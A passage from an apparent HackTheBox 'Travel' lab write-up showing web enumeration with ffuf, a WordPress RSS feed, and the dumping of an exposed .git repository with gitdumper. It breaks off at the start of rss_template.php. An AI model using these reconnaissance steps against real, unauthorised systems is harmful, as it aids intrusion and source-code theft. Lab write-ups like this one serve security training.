</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>www</span><span class=o>.</span><span class=n>travel</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>e</span> <span class=o>.</span><span class=n>txt</span><span class=p>,</span><span class=o>.</span><span class=n>html</span><span class=p>,</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>www</span><span class=o>.</span><span class=n>travel</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Extensions</span>       <span class=p>:</span> <span class=o>.</span><span class=n>txt</span> <span class=o>.</span><span class=n>html</span> <span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=o>.</span><span class=n>html</span>              <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1123</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>104</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>52</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>.</span>                       <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1123</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>104</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>52</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>153068</span><span class=o>/</span><span class=mi>153068</span><span class=p>]</span> <span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>950</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>02</span><span class=p>:</span><span class=mi>41</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>The SSL version of blog.travel.htb and blog-dev.travel.htb are both serving the
same content as <a href=https://www.travel.htb/>https://www.travel.htb/</a> but the version in HTTP is different.</p><p><a href=http://blog.travel.htb/>http://blog.travel.htb/</a></p><p>We may have a hint here:</p><blockquote><p>Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!</p></blockquote><p>The feed URL is: <a href=http://blog.travel.htb/feed/>http://blog.travel.htb/feed/</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;rss</span> <span class=na>xmlns:content=</span><span class=s>&#34;http://purl.org/rss/1.0/modules/content/&#34;</span> <span class=na>xmlns:wfw=</span><span class=s>&#34;http://wellformedweb.org/CommentAPI/&#34;</span> <span class=na>xmlns:dc=</span><span class=s>&#34;http://purl.org/dc/elements/1.1/&#34;</span> <span class=na>xmlns:atom=</span><span class=s>&#34;http://www.w3.org/2005/Atom&#34;</span> <span class=na>xmlns:sy=</span><span class=s>&#34;http://purl.org/rss/1.0/modules/syndication/&#34;</span> <span class=na>xmlns:slash=</span><span class=s>&#34;http://purl.org/rss/1.0/modules/slash/&#34;</span> <span class=na>version=</span><span class=s>&#34;2.0&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;channel&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;title&gt;</span>Travel Blog<span class=nt>&lt;/title&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;atom:link</span> <span class=na>href=</span><span class=s>&#34;http://blog.travel.htb/feed/&#34;</span> <span class=na>rel=</span><span class=s>&#34;self&#34;</span> <span class=na>type=</span><span class=s>&#34;application/rss+xml&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;link&gt;</span>http://blog.travel.htb<span class=nt>&lt;/link&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;description&gt;</span>Who doesn&#39;t love to travel ?<span class=nt>&lt;/description&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;lastBuildDate&gt;</span>Thu, 23 Apr 2020 19:27:27 +0000<span class=nt>&lt;/lastBuildDate&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;language&gt;</span>en-US<span class=nt>&lt;/language&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;sy:updatePeriod&gt;</span> hourly <span class=nt>&lt;/sy:updatePeriod&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;sy:updateFrequency&gt;</span> 1 <span class=nt>&lt;/sy:updateFrequency&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;generator&gt;</span>https://wordpress.org/?v=5.4<span class=nt>&lt;/generator&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;item&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;title&gt;</span>Travel Blog<span class=nt>&lt;/title&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;link&gt;</span>http://blog.travel.htb/2020/04/13/hello-world/<span class=nt>&lt;/link&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;dc:creator&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;![CDATA[ admin ]]&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/dc:creator&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;pubDate&gt;</span>Mon, 13 Apr 2020 13:19:01 +0000<span class=nt>&lt;/pubDate&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;category&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;![CDATA[ Uncategorized ]]&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/category&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;guid</span> <span class=na>isPermaLink=</span><span class=s>&#34;false&#34;</span><span class=nt>&gt;</span>http://localhost/?p=1<span class=nt>&lt;/guid&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;description&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;![CDATA[ Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team! ]]&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/description&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;content:encoded&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;![CDATA[ &lt;p&gt;Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!&lt;/p&gt; ]]&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/content:encoded&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/item&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/channel&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/rss&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Nothing fancy, but it seems to leak the Wordpress version.</p><p>We also have a login area: <a href=http://blog.travel.htb/wp-login.php>http://blog.travel.htb/wp-login.php</a></p><p>I ran a <a href=https://github.com/ffuf/ffuf>ffuf</a> enumeration but won&rsquo;t display it here as it only shows all the
Wordpress files.</p><p><a href=http://blog-dev.travel.htb/>http://blog-dev.travel.htb/</a></p><p>It seems we are denied but it&rsquo;s worth checking if we can leak some files.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>blog</span><span class=o>-</span><span class=n>dev</span><span class=o>.</span><span class=n>travel</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>e</span> <span class=o>.</span><span class=n>txt</span><span class=p>,</span><span class=o>.</span><span class=n>html</span><span class=p>,</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>blog</span><span class=o>-</span><span class=n>dev</span><span class=o>.</span><span class=n>travel</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Extensions</span>       <span class=p>:</span> <span class=o>.</span><span class=n>txt</span> <span class=o>.</span><span class=n>html</span> <span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>.</span>                       <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>403</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>154</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>git</span>                    <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>403</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>154</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>8</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>It seems like there is a git repository.</p><h2 id=http-exploitation--code-analysis>HTTP exploitation & code analysis<a hidden class=anchor aria-hidden=true href=#http-exploitation--code-analysis>#</a></h2><p>Let&rsquo;s start with the git repository with <a href=https://github.com/internetwache/GitTools>GitTools</a> that will allow us
to dump it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>gittools</span><span class=o>-</span><span class=n>gitdumper</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>blog</span><span class=o>-</span><span class=n>dev</span><span class=o>.</span><span class=n>travel</span><span class=o>.</span><span class=n>htb</span><span class=o>/.</span><span class=n>git</span><span class=o>/</span> <span class=n>dev</span><span class=o>-</span><span class=n>repo</span>
</span></span><span class=line><span class=cl><span class=c1>###########</span>
</span></span><span class=line><span class=cl><span class=c1># GitDumper is part of https://github.com/internetwache/GitTools</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Developed and maintained by @gehaxelt from @internetwache</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Use at your own risk. Usage might be illegal in certain circumstances.</span>
</span></span><span class=line><span class=cl><span class=c1># Only for educational purposes!</span>
</span></span><span class=line><span class=cl><span class=c1>###########</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Destination</span> <span class=n>folder</span> <span class=n>does</span> <span class=ow>not</span> <span class=n>exist</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Creating</span> <span class=n>dev</span><span class=o>-</span><span class=n>repo</span><span class=o>/.</span><span class=n>git</span><span class=o>/</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>HEAD</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=n>info</span><span class=o>/</span><span class=n>packs</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>description</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>config</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>COMMIT_EDITMSG</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>index</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>packed</span><span class=o>-</span><span class=n>refs</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>refs</span><span class=o>/</span><span class=n>heads</span><span class=o>/</span><span class=n>master</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>refs</span><span class=o>/</span><span class=n>remotes</span><span class=o>/</span><span class=n>origin</span><span class=o>/</span><span class=n>HEAD</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>refs</span><span class=o>/</span><span class=n>stash</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>logs</span><span class=o>/</span><span class=n>HEAD</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>logs</span><span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>heads</span><span class=o>/</span><span class=n>master</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>logs</span><span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>remotes</span><span class=o>/</span><span class=n>origin</span><span class=o>/</span><span class=n>HEAD</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>info</span><span class=o>/</span><span class=n>refs</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>info</span><span class=o>/</span><span class=n>exclude</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>wip</span><span class=o>/</span><span class=n>index</span><span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>heads</span><span class=o>/</span><span class=n>master</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>wip</span><span class=o>/</span><span class=n>wtree</span><span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>heads</span><span class=o>/</span><span class=n>master</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=mi>03</span><span class=o>/</span><span class=mi>13850</span><span class=n>ae948d71767aff2cc8cc0f87a0feeef63</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=mi>00</span><span class=o>/</span><span class=mi>00000000000000000000000000000000000000</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=n>b0</span><span class=o>/</span><span class=mi>2</span><span class=n>b083f68102c4d62c49ed3c99ccbb31632ae9f</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=n>ed</span><span class=o>/</span><span class=mi>116</span><span class=n>c7c7c51645f1e8a403bcec44873f74208e9</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=mi>2</span><span class=n>b</span><span class=o>/</span><span class=mi>1869</span><span class=n>f5a2d50f0ede787af91b3ff376efb7b039</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=mi>30</span><span class=o>/</span><span class=n>b6f36ec80e8bc96451e47c49597fdd64cee2da</span>
</span></span></code></pre></td></tr></table></div></div><p>Then we can look into this repository:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ git status
</span></span><span class=line><span class=cl>On branch master
</span></span><span class=line><span class=cl>Changes not staged for commit:
</span></span><span class=line><span class=cl>  (use &#34;git add/rm &lt;file&gt;...&#34; to update what will be committed)
</span></span><span class=line><span class=cl>  (use &#34;git restore &lt;file&gt;...&#34; to discard changes in working directory)
</span></span><span class=line><span class=cl>        deleted:    README.md
</span></span><span class=line><span class=cl>        deleted:    rss_template.php
</span></span><span class=line><span class=cl>        deleted:    template.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ git restore README.md rss_template.php template.php
</span></span></code></pre></td></tr></table></div></div><p>It seems we can now read the source code of the RSS generator:
<code>rss_template.php</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
